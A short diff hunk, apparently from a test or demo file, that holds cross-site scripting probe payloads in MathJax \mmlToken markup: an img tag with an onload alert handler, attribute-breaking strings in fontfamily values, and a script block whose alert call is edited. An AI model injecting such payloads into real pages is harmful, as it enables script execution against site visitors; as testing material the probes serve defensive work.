@@ -8,7 +8,7 @@
 \mmlToken{ms}[fontfamily="thxpewpew;I'm in ur walls ;))"]{<YOOOO<></><img src='https://github.com/NotTrueFalse/NotTrueFalse/blob/main/Figaro-Temparia-1694x847.jpeg?raw=true' onload=alert(/1/)>}
 \mmlToken{
         <script>
-            alert(2018);
+            ms(2018);
         </script>
     }[fontfamily="imnothere;11111111111111111111111111111\"'><a></a>"]{demo}
 ```
